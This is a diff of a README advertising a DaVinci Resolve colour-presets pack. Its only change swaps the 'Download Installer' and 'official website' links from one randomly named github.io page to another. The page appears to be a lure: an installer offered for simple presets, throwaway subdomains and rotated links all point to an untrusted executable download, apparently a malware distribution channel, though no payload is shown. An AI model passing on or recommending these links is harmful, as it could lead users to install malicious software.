@@ -2,7 +2,7 @@
 
 Welcome to the DaVinci Resolve Professional Presets Pack, a comprehensive collection of color grading presets designed for DaVinci Resolve 19. This pack includes over 50 professionally crafted presets that help you achieve cinematic looks, film emulation, and creative effects with just a few clicks. Whether you're a filmmaker, content creator, or video editor, these presets will streamline your color grading workflow and elevate your projects.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -44,6 +44,6 @@ A: No, these presets are specifically designed for DaVinci Resolve. They are not
 
 Download the latest version of the DaVinci Resolve Professional Presets Pack from the official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 For support or inquiries, please open an issue on this GitHub repository or contact us via email.
